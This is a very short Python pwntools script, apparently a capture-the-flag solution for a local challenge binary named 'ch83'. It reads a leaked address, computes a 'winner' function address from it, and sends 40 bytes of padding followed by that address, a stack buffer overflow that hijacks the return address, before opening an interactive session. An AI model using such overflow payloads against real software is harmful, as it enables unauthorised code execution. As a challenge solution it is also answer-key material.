from pwn import *

sh = process("./ch83")

winner_addr = p64(int(sh.recv().split("(): ")[1], 16) -160)
sh.sendline("A" * 40 + winner_addr)

sh.interactive()